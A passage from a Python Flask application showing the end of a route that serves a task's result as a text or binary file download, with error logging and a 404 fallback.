                    filename = f'{task_id}.txt'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Handle bytes data
                elif isinstance(result, bytes):
                    content = result
                    mimetype = 'application/octet-stream'
                    filename = f'{task_id}.bin'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Fallback for any other type
                else:
                    content = str(result)
                    mimetype = 'text/plain'
                    filename = f'{task_id}.txt'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
            except Exception as e:
                logging.error(f"Error processing download for task {task_id}: {str(e)}")
                return str(e), 500
    return 'Result not found', 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
